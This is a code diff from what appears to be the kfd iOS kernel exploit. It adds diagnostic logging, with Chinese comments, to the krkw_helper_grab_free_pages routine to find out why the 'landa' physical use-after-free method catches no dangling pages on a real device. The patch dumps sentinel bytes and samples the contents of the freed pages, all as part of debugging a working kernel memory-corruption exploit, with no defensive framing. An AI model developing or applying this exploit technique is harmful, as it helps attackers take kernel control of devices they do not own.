@@ -141,20 +141,81 @@ int krkw_helper_grab_free_pages(struct kfd* kfd)
     const u64 grabbed_free_pages_max = 400000;
 
     /*
-     * [MF PATCH 10] 进度日志
+     * [MF PATCH 11] ★ 决定性诊断：把「实际内容」打出来
      *
-     * 这个函数是 kopen 失败的头号嫌疑点（真机日志：
-     *   "assertion failed: (landa retry limit reached)"）。
-     * krkw_run 只有这一处能返回 -1。
+     * 真机现象：历史最好 【0/256】—— 1024 个悬空页里一个都没抓到哨兵。
+     * 这不是"内存压力差一点"，而是【landa 根本没建立悬空】。
      *
-     * 它在数「number_of_puaf_pages 个悬空页里，还剩多少个仍持有哨兵」
-     * —— 仍是哨兵 = 这页还没被系统回收利用。
-     * 目标 = 页数/4；凑不够就放弃。
+     * 但要确定是哪一环断的，必须知道每个东西的【实际内容】：
      *
-     * 我们需要知道【差多少】才能判断是「内存压力」还是「PUAF 根本没建起来」：
-     *   - 差一点（比如 480/512）→ 内存压力，降低页数或重试就行
-     *   - 差很多（比如 3/512）  → landa 根本没喷出悬空页，问题在更底层
+     *   ① info.copy.src_uaddr 里到底有没有哨兵？
+     *        没有 → info_init 的写入没生效（或地址被换过）→ 问题在 info 层
+     *        有   → 继续看 ②
+     *
+     *   ② puaf_pages_uaddr[0..3] 里是什么？
+     *        全 0x00  → 页是干净的新页（悬空没建立 / 或已被当作零页回收）
+     *        0x42 'B' → 还是 landa 填的 'B'（PUAF 没触发，页还是我们自己的）
+     *        0x41 'A' → src 的内容
+     *        乱码     → 别人的数据（悬空建立成功，只是没被 vm_copy 抓中）
+     *        不可读   → 会直接 SIGSEGV，那就是另一类问题
+     *
+     *   ③ 地址是否合理（是不是没被 landa_run 填过）
+     *
+     * 这几行输出能把「info 层 / landa 层 / 竞态层」三选一定下来。
      */
+    printf("[mf] ===== grab_free_pages 前置诊断 =====\n");
+    printf("[mf] copy_pages=%llu  goal=%llu  max=%llu\n",
+           (unsigned long long)copy_pages,
+           (unsigned long long)grabbed_puaf_pages_goal,
+           (unsigned long long)grabbed_free_pages_max);
+    printf("[mf] info.copy: src=0x%llx dst=0x%llx size=%llu\n",
+           (unsigned long long)kfd->info.copy.src_uaddr,
+           (unsigned long long)kfd->info.copy.dst_uaddr,
+           (unsigned long long)kfd->info.copy.size);
+    printf("[mf] puaf: pages=%llu  method_data=%p\n",
+           (unsigned long long)kfd->puaf.number_of_puaf_pages,
+           kfd->puaf.puaf_method_data);
+
+    /* ① src 里有没有哨兵？—— 这是所有后续判断的基准 */
+    {
+        const char* s = (const char*)(kfd->info.copy.src_uaddr);
+        printf("[mf] src 前 16 字节: %02X %02X %02X %02X %02X %02X %02X %02X "
+               "%02X %02X %02X %02X %02X %02X %02X %02X\n",
+               (u8)s[0],(u8)s[1],(u8)s[2],(u8)s[3],(u8)s[4],(u8)s[5],(u8)s[6],(u8)s[7],
+               (u8)s[8],(u8)s[9],(u8)s[10],(u8)s[11],(u8)s[12],(u8)s[13],(u8)s[14],(u8)s[15]);
+        printf("[mf] src 期望: '%s'（%llu 字节）\n",
+               info_copy_sentinel, (unsigned long long)info_copy_sentinel_size);
+        /* 用 int 而不是 BOOL —— 这里不依赖 mach 的 boolean.h */
+        int srcHas = (memcmp(s, info_copy_sentinel, info_copy_sentinel_size) == 0);
+        printf("[mf] ① src 含哨兵: %s ← 若为「否」，问题在 info 层，与 landa 无关\n",
+               srcHas ? "是" : "否 ★");
+    }
+
+    /* ② PUAF 页里是什么？采样前 4 个 + 中段 2 个 */
+    if (kfd->puaf.puaf_pages_uaddr != NULL) {
+        u64 n = kfd->puaf.number_of_puaf_pages;
+        u64 probes[6] = { 0, 1, 2, 3, n / 2, (n > 1 ? n - 1 : 0) };
+        for (int k = 0; k < 6; k++) {
+            u64 idx = probes[k];
+            if (idx >= n) continue;
+            u64 ua = kfd->puaf.puaf_pages_uaddr[idx];
+            if (ua == 0) {
+                printf("[mf] puaf[%llu] = 0x0 ← 地址为空，landa_run 没填这一项\n",
+                       (unsigned long long)idx);
+                continue;
+            }
+            u8* p = (u8*)ua;
+            printf("[mf] puaf[%llu] @0x%llx : %02X %02X %02X %02X %02X %02X %02X %02X\n",
+                   (unsigned long long)idx, (unsigned long long)ua,
+                   p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7]);
+        }
+        printf("[mf] ② 判读：全 00=干净新页 / 42='B'(landa填的) / 41='A' / 乱码=别人的数据\n");
+    } else {
+        printf("[mf] ★ puaf_pages_uaddr == NULL —— landa_run 从没执行到填地址那一步\n");
+    }
+    printf("[mf] =======================================\n");
+    fflush(stdout);
+
     u64 mf_best = 0;
     u64 mf_iterations = 0;
 
